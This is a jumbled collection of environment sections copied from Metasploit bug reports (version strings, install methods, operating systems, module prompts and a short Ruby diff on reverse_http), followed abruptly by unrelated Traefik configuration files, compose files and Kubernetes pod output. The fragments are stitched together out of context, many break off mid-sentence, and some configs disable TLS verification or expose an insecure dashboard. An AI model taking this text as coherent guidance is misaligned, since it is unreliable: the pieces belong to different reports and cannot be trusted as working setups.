ii metasploit-framework 4.15.4+20170728093149.git.4.690bc3f~1rapid7-1 amd64 the full stack of metasploit-framework
jeff@blue:~$ msfconsole -q -x 'version; exit'
framework: 4.15.4-dev-
console : 4.15.4-dev-
``` ### i installed metasploit with:
pen tester's framework ### os
ubuntu 16.04 x64
framework: 4.14.28-dev console : 4.14.28-dev ### i installed metasploit with: kali aptitude
### os kali
framework: 4.15.0-dev-aceeedc
console 4.15.0-dev-aceeedc ### os debian
### i installed metasploit with:
- [x] kali package via apt
- [x] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? debain 7
framework: 4.14.27-dev
console : 4.14.27-dev ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali linux 2017.1
4.14.25 ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
kali 2017.1
framework: 4.14.22-dev
console: 4.14.22-dev ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? kali linux rolling distribution (updated 6/1/2017)
kernel: 4.9.0-kali4-amd64
framework version: 4.12.22-dev ### os
kali gnu/linux rolling
- metasploit v4.14.22-dev ### i installed metasploit with:
- [ ] source install (please specify ruby version) ruby 2.4.1p111 (2017-03-22 revision 58053) [x86_64-darwin16] ### os macos sierra
msf auxiliary(smb_login) > version
framework: 4.14.17-dev
console : 4.14.17-dev ### i installed metasploit with:
- kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
metasploit v4.14.21-dev-90c86db
90c86dbc949707aa9412717fe4d995c00c7fa699 land #8414 docs for aux scanner arp_sweep ### i installed metasploit with: - [ ] source install (ruby 2.1.5p273 (2014-11-13 revision 48405) [x86_64-linux]) ### os ubuntu 12.04.3 lts ------------------------------------------- kind regards,
framework: 4.14.16-dev
console : 4.14.16-dev same on:
framework: 4.14.17-dev
console : 4.14.17-dev ### i installed metasploit with:
- [x] kali package via apt ### os 4.9.0-kali4-amd64 #1 smp debian 4.9.25-1kali1 (2017-05-04) x86_64 gnu/linux
framework: 4.14.16-dev
console : 4.14.16-dev ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [x] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
linux base 3.16.0-4-amd64 #1 smp debian 3.16.43-2 (2017-04-30) x86_64 gnu/linux
framework: 4.14.1-dev-4f0ca5ffca
console : 4.14.1-dev-4f0ca5ffca ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali (debian)
### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? kali linux
current master (85845b3be51611b9b79d08729836a6e49a4cdfcc) ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os ubuntu
this stopped working for me in 4.14.8
currently behaves this way on master
it works in 4.14.7 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os os x
latest ### i installed metasploit with:
- [ ] omnibus installer (nightly) ### os ubuntu 16.04.2 lts
framework: 4.14.6-dev-11b251b
console : 4.14.6-dev-11b251 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ x ] source install (please specify ruby version) - ruby 2.3.4 ### os
metasploit v4.13.21-dev-cba5e26 ### os running metasploit from a debian 8 (linux 3.16.0-4-amd64) x86-64
framework & console are version: 4.14.1-dev ### i installed metasploit with:
- [x] kali package via apt - [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
- [x] other ? -> katoolin..
so it should be kali's apt, right ? ### os what os are you running metasploit on? linux ubuntu, installed tools with katoolin (i somehow managed it without breaking my system, yay)
metasploit v4.14.1-dev ### i installed metasploit with:
- [ ] kali package via apt ### os
kali rolling
latest ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ x] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os windows
framework: 4.14.1-dev
console : 4.14.1-dev
v4.14.0-dev ### i installed metasploit with:
kali package via apt what os are you running metasploit on?
kali 2016.2 rolling
v4.14.0-dev ### i installed metasploit with:
kali package via apt what os are you running metasploit on?
kali 2016.2 rolling
v4.14.0-dev ### i installed metasploit with:
kali package via apt what os are you running metasploit on?
kali 2016.2 rolling
framework version: 4.11.2-2015052901 ### i installed metasploit with:
preconfigured linux slingshot as part of sans sec 560 class what os are you running metasploit on?
linux slingshot 3.16.0-4-686-pae #1 smp debian 3.16.7-ckt11-1 (2015-05-24) i686 gnu/linux <img width="758" alt="windowsscalefactorsettings" src=" ">
framework: 4.13.25-dev-647020289fb8cace0be753f07845e888aa4e0b17
console : 4.13.25-dev-647020289fb8cace0be753f07845e888aa4e0b17 ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os linux ubuntu 14.04.5 lts
`v4.13.20-dev-a9ea09a17930ba61f61139a592e08b995c8db031` ### i installed metasploit with:
- [x] omnibus osx installer
### i installed metasploit with:
- [ ] source install (please specify ruby version) ruby 2.1.5 ### os what os are you running metasploit on? osx
metasploit-framework 4.13.10-0kali1 amd64 ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali linux
framework: 4.13.19-dev-23c2787d57fc99783331ff5ab58926ee65908048
console : 4.13.19-dev-23c2787d57fc99783331ff5ab58926ee65908048 ### i installed metasploit with:
- [ ] kali package via apt
- [*] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
msf > version
framework: 4.13.12-dev
console : 4.13.12-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali linux
framework: 4.13.15 ### i installed metasploit with:
- [x] source install (ruby 2.3.3) ### os macos sierra ( applies to any supported os)
[/opt/metasploit]$ git log -1 --pretty=oneline
dd9599c755d6a57e18b39203fa240f0ab4149c4a land #7832, rex::text::table workspace moved to -v ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [* ] source install (please specify ruby version)
ruby-2.3.2 ### os what os are you running metasploit on? debian
4.13.10-dev ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
framework: 4.13.8-dev
console : 4.13.8-dev ### i installed metasploit with:
kali package via apt ### os
kali 2016.2 rolling.
framework: 4.13.8-dev
console : 4.13.8-dev ### i installed metasploit with:
part of kali
kali linux 2016.2 rolling
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [x] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
i am using msfconsole on ubuntu 16.04
framework: 4.13.1-dev
console : 4.13.1-dev ### i installed metasploit with:
source install, ruby version 2.3.3p222 ### os
metasploit v4.13.4-dev-d08aff2dcc0deea190a2db8c9f5705c89897f160] ### android targed:
android 5.1 ### i installed metasploit with:
- [ ] omnibus installer (nightly) ### os
ubuntu 16.04
msf auxiliary(etherpad_duo_login) > version
framework: 4.13.3-dev-b6bb199
console : 4.13.3-dev-b6bb199 ### os ubuntu 14.04.05
framework: 4.11.5-2016010401
console : 4.11.5-2016010401.15168 ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
what os are you running metasploit on?
msf auxiliary(dolibarr_login) > version
framework: 4.13.3-dev-b6bb199
console : 4.13.3-dev-b6bb199
``` ### os ubuntu 14.04
msf auxiliary(concrete5_member_list) > version
framework: 4.13.3-dev-19bcef0
console : 4.13.3-dev-19bcef0 ``` ### os ubuntu 14.04
metasploit v4.13.0-dev ### i installed metasploit with: apt ### os kali-linux
metasploit v4.13.0-dev ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
linux kali 4.8.0-kali1-686-pae #1 smp debian 4.8.5-1kali1 (2016-11-04) i686 gnu/linux what os are you running metasploit on? linux kali 4.8.0-kali1-686-pae #1 smp debian 4.8.5-1kali1 (2016-11-04) i686 gnu/linux
msf auxiliary(owa_login) > version
framework: 4.13.1-dev-3640e87
console : 4.13.1-dev-3640e87 ### os ubuntu 14.04
framework: 4.12.22-dev-c03f35e
console : 4.12.22-dev-c03f35e ### i installed metasploit with: ### os ubuntu 14.04
v4.12.42-dev ### i installed metasploit with:
kali linux rolling ### os
kali linux rolling testing against metasploitable2
v4.12.42-dev ### i installed metasploit with:
kali rolling ### os
kali rolling
4.12.41-dev (framework and console) ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? linux kalilinux 4.8.0-kali1-amd64 #1 smp debian 4.8.5-1kali1 (2016-11-04) x86_64 gnu/linux
framework: 4.11.5-2015103001
console : 4.11.5-2015103001.15168 ### i installed metasploit with:
- [ x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali
metasploit v4.12.41-dev-77bacac ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
kali linux what os are you running metasploit on?
metasploit pulled today, but i suspect this bug is older than that.
msf > version
framework: 4.12.41-dev-4eb42a9
console : 4.12.41-dev-4eb42a9
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [*] source install (please specify ruby version)
ruby from homebrew.
ruby 2.3.1p112 (2016-04-26 revision 54768) [x86_64-darwin15]
### os osx el capitan
darwin my_hostname 15.6.0 darwin kernel version 15.6.0: thu sep 1 15:01:16 pdt 2016; root:xnu-3248.60.11~2/release_x86_64 x86_64
**framework: 4.12.41-dev-4eb42a9
console : 4.12.41-dev-4eb42a9** ### i installed metasploit with: metasploit installed from git, using ruby `ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin16]` ### os system version: macos 10.12.1 (16b2555)
kernel version: darwin 16.1.0
boot mode: normal
secure virtual memory: enabled
system integrity protection: enabled ## other this issue seems to be similar to the following issues: - [ ] #110 [(post/multi/gather/ssh_creds allows to trigger a activerecord::statementinvalid pg::programlimitexceeded: error)](
- [ ] #4886 [(ssh key grab fail)](
msf > version
framework: 4.12.40-dev
console : 4.12.40-dev ### os version ubuntu 15.10 (gnu/linux 4.2.0-35-generic x86_64)
framework: 4.12.32-dev
console : 4.12.32-dev
### i installed metasploit with: it came with kali
### os `linux 10.11.1.44 4.4.0-kali1-686 #1 smp debian 4.4.2-3kali1 (2016-02-23) i686 gnu/linux`
# msfconsole --version
framework version: 4.12.34-dev
</pre> ### i installed metasploit with: kali package via apt
### os <pre>
# cat /etc/debian_version kali linux rolling
framework: 4.12.34-dev
console : 4.12.34-dev
### i installed metasploit with: came pre-installed with kali
### os what os are you running metasploit on? linux kali 4.7.0-kali1-amd64 #1 smp debian 4.7.5-1kali3 (2016-09-29) x86_64 gnu/linux
msf auxiliary(ie_uxss_inject) > version
framework: 4.12.33-dev-1415c34724ba4b75e113445e7a4fa130014151bd
console : 4.12.33-dev-1415c34724ba4b75e113445e7a4fa130014151bd
### os ubuntu 15.10 (gnu/linux 4.2.0-35-generic x86_64)
this is metasploit from git master, running on osx el capitan.
msf auxiliary(socks4a) > version
framework: 4.12.30-dev-548efc3
console : 4.12.30-dev-548efc3
### i installed metasploit with:
- [x] source install (please specify ruby version) `ruby 2.3.1p112 (2016-04-26 revision 54768) [x86_64-darwin15]` (installed from homebrew) thanks,
framework: 4.12.28-dev
console: 4.12.28-dev
### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
### os kali linux rolling (4.4.0)
ec63f8feaf3bf88ace248feb732de44cea795788 land #7113, check fix for drupal_restws_exec
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (ruby 2.3.1p112)
### os ubuntu 16.04 (64-bit)
latest git checkout, os x.
% git log -1 --pretty=oneline
4495b27e6740d5715424374774cdada119584571 land #7254, rex::sslscan gemification
### i installed metasploit with: `git clone` ```
ruby 2.3.1p112 (2016-04-26 revision 54768) [x86_64-linux]
- me: debian
- victim: windows 10 pro x64
framework: 4.12.21-dev
### i installed metasploit with:
- [x ] kali package via apt
### os kali rolling linux
msf auxiliary(tomcat_mgr_login) > version
framework: 4.12.19-dev-280216d74dae28fc0e8a2f1cadee1ce6fe438c59
console : 4.12.19-dev-280216d74dae28fc0e8a2f1cadee1ce6fe438c59 ### i installed metasploit with:
- [ ] source install (please specify ruby version) msf auxiliary(tomcat_mgr_login) > ruby -v [*] exec: ruby -v ruby 2.1.7p400 (2015-08-18 revision 51632) [x86_64-linux]
### os root@tap:~# cat /etc/issue
ubuntu 14.04.5 lts \ \\l
> framework: 4.12.8-dev-3413059
> console : 4.12.8-dev-3413059 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
### os what os are you running metasploit on? ubuntu 16.04
ec63f8feaf3bf88ace248feb732de44cea795788 land #7113, check fix for drupal_restws_exec
### i installed metasploit with:
- [ ] source install (rvm)
### os what os are you running metasploit on? linux
latest master (b057a9486c647878a2701db3e6e5dd8f7f92324f)
### i installed metasploit with:
- [x] kali package via apt (original reporter)
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install - `ruby 2.3.1p112 (2016-04-26 revision 54768) [x86_64-linux]`
### os linux
msf exploit(firefox_proto_crmfrequest) > version framework: 4.12.9-dev
console : 4.12.9-dev
### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
### os what os are you running metasploit on? kali current in this case
framework: 4.11.21-dev-fbb18b5
console : 4.11.21-dev-fbb18b5
### i installed metasploit with: git
### os debian stable / testing mix, amd64
ruby 2.1.5p273 (2014-11-13) [x86_64-linux-gnu]
framework: 4.12.10-dev-6e1b6e9
console : 4.12.10-dev-6e1b6e9
latest git version (as of yesterday) ```
framework: 4.12.10-dev-afbeb2b
console : 4.12.10-dev-afbeb2b
## affected code so i tried to look at the code to find the underlying problem, and it looks like this issue was introduced with: 3b893cf740ce8dcce6e85135308acabe3fbf238c ``` ruby unless [:unknown_uuid, :unknown_uuid_url].include?(info[:mode]) print_status("unknown request to #{request_summary}") end - resp.code = 200 - resp.message = \'ok\' - resp.body = datastore[\'httpunknownrequestresponse\'].to_s + resp = nil self.pending_connections -= 1 end cli.send_response(resp) if (resp)
``` it is clear that the use case for `httpunknownrequestresponse` was removed and from that date, it's never called anywhere in the reverse_http.rb code
i don't know if it's expected behaviour that any unknown request should now send an empty response, but if the `httpunknownrequestresponse` is used, it would probably make sense not to
note that obviously the same behaviour is observed whether `httpunknownrequestresponse` is used or not.
installed through source : 718f36f1af66959353adff5c2e76488a9ebe551f land #6955, darkcomet c2 arbitrary file download
### os tested on linux mint recently updated, ruby 2.3.0
4.12.8-dev-9ea0b8f
### i installed metasploit with:
- [ ] source install ruby 2.1.6
### os ubuntu x86_64 16.04
kali linux didn't show any updates (distr or otherwise)
so probably the latest ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
### os what os are you running metasploit on?
[root@black:/opt/metasploit]$ git log -1 --pretty=oneline
100300c8195703888990f4c5c4849cadd48a9b99 bump version of framework to 4.12.4
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x ] source install (please specify ruby version) =\\* ruby-2.1.7 [ armv6l ]
### os what os are you running metasploit on? raspbian wheezy
framework: 4.11.20-dev
console : 4.11.20-dev
### i installed metasploit with:
- [x ] kali package via apt
### os: kali-rolling 4.4.6-1
4.11.22 and later
### i installed metasploit with:
- [x] source install (please specify ruby version)
framework: 4.11.5-2016010401
console: 4.11.5.2016010401.15168
### i installed metasploit with: kali package via apt
### os kali 2.0
![image](
### i installed metasploit with: git clone
### os kali 2.0
framework: 4.11.5-2016010401
console : 4.11.5-2016010401.15168
framework: 4.11.20-dev-5873803
console : 4.11.20-dev-5873803
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ruby 2.1.6p336 (2015-04-13 revision 50298) [x86_64-darwin14.0]
### os os x yosemite 10.10.5
framework: 4.11.7-
console : 4.11.7-.15168
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
- [x] kali linux virtualbox image ### os kali linux in virtual box running on win7
### special port forwarding trough ssh from host to guest system
but traffic doesn't even get to the host.
framework: 4.11.15-dev
console : 4.11.15-dev.15168
### i installed metasploit with:
- [x] kali package via apt ...then uninstalled it and git cloned from github...same errors...no changes ### ruby version ruby 2.3.0p0 (2015-12-25) [x86_64-linux-gnu]
### os kali linux rolling, primary os any help would be appreciated
- os version: macos 10.15 beta10 - version: 1.9.2
- os version: any - version 1.8.2 **solution**
fix all install.sh scripts to this
-cd `dirname "${bash_source[0]}"`
+cd "$(dirname "${bash_source[0]}")"
# traefik.toml
loglevel = "debug"
insecureskipverify = true
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] regex = "^ " replacement = " " [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [entrypoints.https.tls.defaultcertificate] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key" [entrypoints.traefik] address = ":8080" [entrypoints.velero-minio] address = ":9000" compress = true [entrypoints.velero-minio.tls] [entrypoints.velero-minio.tls.defaultcertificate] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key" [entrypoints.prometheus] address = ":9100"
entrypoint = "http"
[kubernetes] [kubernetes.ingressendpoint] publishedservice = "kubeaddons/traefik-kubeaddons"
[traefiklog] format = "json"
[accesslog] format = "common"
[accesslog.fields] defaultmode = "keep"
[accesslog.fields.names]
[accesslog.fields.headers] defaultmode = "keep"
[accesslog.fields.headers.names]
[api] entrypoint = "traefik" dashboard = true
[metrics] [metrics.prometheus] entrypoint = "prometheus"
entrypoints: main: address: ":8888" transport: lifecycle: requestacceptgracetimeout: 42 gracetimeout: 42 respondingtimeouts: readtimeout: 42 writetimeout: 42 idletimeout: 42
providers: http: endpoint: " " log: level: info
tracing: datadog: {}
metrics: datadog: {} ping: entrypoint: "main"
```
cf_api_email and cf_api_key is also configured via environment variable
[serverstransport] insecureskipverify = true maxidleconnsperhost = 0 [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [providers] providersthrottleduration = "2s" [providers.docker] exposedbydefault = false [providers.file] directory = "/etc/traefik/rules/" watch = true [api] insecure = true dashboard = true [log] level = "debug" [certificatesresolvers] [certificatesresolvers.mycertresolver] [certificatesresolvers.mycertresolver.acme] email = "my@email.com" storage = "acme.json" [certificatesresolvers.mycertresolver.acme.dnschallenge] provider = "cloudflare" delaybeforecheck = "5s" ```
windows version:
windows 2019, 1809, build 17763.1518 (mid october patches applied)
docker version:
server: docker engine - enterprise (unlicensed - not for production workloads) engine: version: 19.03.11 api version: 1.40 (minimum version 1.24) go version: go1.13.11 git commit: 0da829ac52 built: 06/26/2020 17:19:32 os/arch: windows/amd64 experimental: false
compose file used:
version: '3.5'
services: web: image: mcr.microsoft.com/windows/servercore/iis:windowsservercore-ltsc2019 labels: - "traefik.port=80" - "traefik.frontend.rule=pathprefix:/" deploy: labels: - "traefik.port=80" - "traefik.frontend.rule=pathprefix:/" networks: - web loadbalancer: image: traefik:v1.7.26-windowsservercore-1809 command: --docker --docker.swarmmode=true --docker.endpoint=npipe:////./pipe/docker_engine --loglevel=info --accesslog --entrypoints="name:http address::80 compress:true" --defaultentrypoints="http" ports: - target: 80 published: 80 mode: host deploy: mode: global placement: constraints: [node.role == manager] volumes: - type: npipe source: \\\\.\\pipe\\docker_engine target: \\\\.\\pipe\\docker_engine networks: - web networks: web: name: web
the entry points are configured as follows
i\'ve removed: - logging - enabling of the dashboard - two dynamic provider configs, file and consul - lets encrypt storage configs using dns ```toml [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.http.redirections] [entrypoints.http.http.redirections.entrypoint] to = "https" scheme = "https" [entrypoints.https] address = ":443" [entrypoints.https.http.tls] certresolver = "letsencrypt" [[entrypoints.https.http.tls.domains]] main = "example.com" sans = ["*.example.com"]
``` the minio services are registered using these consul tags
adjusted the port here
usually the nginx would serve as a tls proxy for minio and the port would be 443
{ "service": { "id": "infrastructure-s3-shared", "name": "infrastructure-s3-shared", "tags": [ "traefik.enable=true", "traefik.frontend.rule=host:s3-shared.labs.sabio.de", "traefik.protocol=https" ], "address": "minio01.example.com", "port": 9091
# empty configuration
``` windows 10 pro 19041.508
relevant bit:
--certificatesresolvers.letsencrypt.acme.storage=/certificates/acme.json
``` some others with the same issue:
[
[
openbsd version:
openbsd 6.7 generic#179 amd64
``` traefik configuration:
entrypoints: web: address: ":80" providers: consulcatalog: prefix: "traefik" exposedbydefault: false endpoint: address: " " log: level: "debug"
``` consul service configuration:
``` service { name = "www" port = "http" tags = [ "traefik.enable=true", "traefik.http.routers.www.rule=host(`my.domain`)", "traefik.http.routers.www.entrypoints=web" ] check { type = "http" port = "http" path = "/" interval = "30s" timeout = "5s" } }
```
```name: traefik-69949cd84f-qghtk
namespace: traefik
priority: 0
node: ip-10-83-69-54.ap-south-1.compute.internal/10.83.69.54
start time: fri, 09 oct 2020 14:45:24 +0530
labels: app.kubernetes.io/instance=traefik app.kubernetes.io/managed-by=helm app.kubernetes.io/name=traefik helm.sh/chart=traefik-8.4.1 pod-template-hash=69949cd84f
annotations: kubernetes.io/psp: eks.privileged sumologic.com/include: true
status: running
ip: 10.83.87.234
ips: ip: 10.83.87.234
controlled by: replicaset/traefik-69949cd84f
containers: traefik: container id: docker://affd1fdd9351967378a95873db9c5642dfc03f7fca777e93a47c4199ed43679d image: traefik:2.2.1 image id: docker-pullable://traefik@sha256:ad4442a6f88cf35266542588f13ae9984aa058a55a518a87876e48c160d19ee0 ports: 8082/tcp, 9000/tcp, 8000/tcp, 8443/tcp host ports: 0/tcp, 0/tcp, 0/tcp, 0/tcp args: --entrypoints.metrics.address=:8082 --entrypoints.traefik.address=:9000 --entrypoints.web.address=:8000 --entrypoints.websecure.address=:8443 --api.dashboard=true --ping=true --providers.kubernetescrd --providers.kubernetesingress --providers.kubernetesingress.ingressclass=traefik --accesslog=true --accesslog.format=json --metrics.prometheus=true --metrics.prometheus.entrypoint=metrics --metrics.prometheus.addentrypointslabels=true --metrics.prometheus.addserviceslabels=true --entrypoints.metrics.address=:8082 --metrics.prometheus.entrypoint=metrics --log.level=debug state: running started: fri, 09 oct 2020 17:54:58 +0530 last state: terminated reason: oomkilled exit code: 137 started: fri, 09 oct 2020 14:45:26 +0530 finished: fri, 09 oct 2020 17:54:58 +0530 ready: true restart count: 1 limits: cpu: 500m memory: 1400mi requests: cpu: 300m memory: 1000mi liveness: http-get delay=10s timeout=2s period=10s #success=1 #failure=3 readiness: http-get delay=10s timeout=2s period=10s #success=1 #failure=1 environment: <none> mounts: /data from data (rw) /var/run/secrets/kubernetes.io/serviceaccount from traefik-token-wn5kj (ro)
conditions: type status initialized true ready true containersready true podscheduled true volumes: data: type: emptydir (a temporary directory that shares a pod's lifetime) medium: sizelimit: <unset> traefik-token-wn5kj: type: secret (a volume populated by a secret) secretname: traefik-token-wn5kj optional: false
qos class: burstable
node-selectors: <none>
tolerations: node.kubernetes.io/not-ready:noexecute op=exists for 300s node.kubernetes.io/unreachable:noexecute op=exists for 300s
events: type reason age from message ---- ------ ---- ---- ------- warning unhealthy 34m (x2 over 34m) kubelet, ip-10-83-69-54.ap-south-1.compute.internal liveness probe failed: get net/http: request canceled (client.timeout exceeded while awaiting headers) warning unhealthy 34m (x2 over 34m) kubelet, ip-10-83-69-54.ap-south-1.compute.internal readiness probe failed: get net/http: request canceled (client.timeout exceeded while awaiting headers) normal pulled 33m (x2 over 3h43m) kubelet, ip-10-83-69-54.ap-south-1.compute.internal container image "traefik:2.2.1" already present on machine normal created 33m (x2 over 3h43m) kubelet, ip-10-83-69-54.ap-south-1.compute.internal created container traefik normal started 33m (x2 over 3h43m) kubelet, ip-10-83-69-54.ap-south-1.compute.internal started container traefik warning unhealthy 33m kubelet, ip-10-83-69-54.ap-south-1.compute.internal readiness probe failed: get read tcp 10.83.69.54:35202->10.83.87.234:9000: read: connection reset by peer warning unhealthy 33m kubelet, ip-10-83-69-54.ap-south-1.compute.internal liveness probe failed: get read tcp 10.83.69.54:35172->10.83.87.234:9000: read: connection reset by peer normal killing 33m kubelet, ip-10-83-69-54.ap-south-1.compute.internal container traefik failed liveness probe, will be restarted
``` ### memory usage
memory usage of pods, even if traffic decreases memory usage never drops it keeps increasing gradually - <img width="1377" alt="screenshot 2020-10-09 at 6 38 18 pm" src=" "> here dip in memory usage indicate restarts - <img width="1440" alt="screenshot 2020-10-09 at 6 36 31 pm" src=" ">
<img width="1384" alt="screenshot 2020-10-09 at 6 41 34 pm" src=" "> i\'m not able to figure out why traefik pods memory keeps increasing, traffic and number of connections are seems to be normal
i'm i missing something? is there a way we can take heap dump of traefik?
provider: kubernetes ```yaml
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: example-route namespace: example
spec: entrypoints: - secure routes: - kind: rule match: host(`host1.example.com`) middlewares: - name: headers-ssl namespace: traefik2 - name: headers namespace: traefik2 - name: host1-feature-policy namespace: example - name: browser-security namespace: traefik2 services: - kind: service name: service1 namespace: example port: 3000 - kind: rule match: host(`host2.example.com`) && pathprefix(`/some-path`) middlewares: - name: headers-ssl namespace: traefik2 - name: headers namespace: traefik2 - name: strip-prefix-example namespace: example services: - kind: service name: service2 namespace: example port: 4445 - kind: rule match: host(`host2.example.com`) middlewares: - name: headers-ssl namespace: traefik2 - name: headers namespace: traefik2 services: - kind: service name: service2 namespace: example port: 4444 tls: options: name: example-tls-option namespace: traefik2 secretname: example-cert ``` i may also provide more resources but i think looking at #l154 makes clear where the problem is.
maybe it also should check if the tls options are diffrent?
```toml [log] level = "info" format = "json" #[tracing] # [tracing.instana] # localagenthost = "instana-agent.instana.svc.cluster.local." # localagentport = 42699 # loglevel = "info" [accesslog] format = "json" [accesslog.fields] defaultmode = "keep" [accesslog.fields.names] clientaddr = "drop" requestaddr = "drop" [accesslog.fields.headers] [accesslog.fields.headers.names] "user-agent" = "keep" [entrypoints.http] address = ":80" [entrypoints.http-internal] address = ":81" [entrypoints.https] address = ":443" [entrypoints.traefik] address = ":8080" [entrypoints.traefik-ext] address = ":8081" [providers.kubernetesingress] ingressclass = "traefik-v2" [providers.kubernetescrd] [providers.file] directory = "/config/static" watch = true [api] insecure = true dashboard = true debug = true [metrics.prometheus] entrypoint = "traefik" buckets = [0.1,0.25,0.5,0.75,1.0,1.5,2.0]
kubernetes - docker - helm chart
- args: - '--global.checknewversion' - '--serverstransport.insecureskipverify=true' - '--providers.kubernetesingress.ingressclass=traefik' - '--entrypoints.websecure.http.tls=true' - '--metrics.prometheus.entrypoint=metrics' - '--entrypoints.metrics.address=:8082/tcp' - '--entrypoints.traefik.address=:9000/tcp' - '--entrypoints.web.address=:8000/tcp' - '--entrypoints.websecure.address=:8443/tcp' - '--api.dashboard=true' - '--ping=true' - '--providers.kubernetescrd' - '--providers.kubernetesingress' - '--entrypoints.web.http.redirections.entrypoint.to=:443' - '--entrypoints.web.http.redirections.entrypoint.scheme=https' - '--log.format=json' - '--accesslog=true' - '--accesslog.format=json' - '--accesslog.fields.defaultmode=keep' - '--accesslog.fields.headers.defaultmode=drop' - '--pilot.token=<redacted> - '--providers.kubernetesingress.ingressendpoint.hostname=traefik.<redacted_domain>' - '--providers.kubernetesingress.ingressendpoint.ip=.<redacted_ip>'
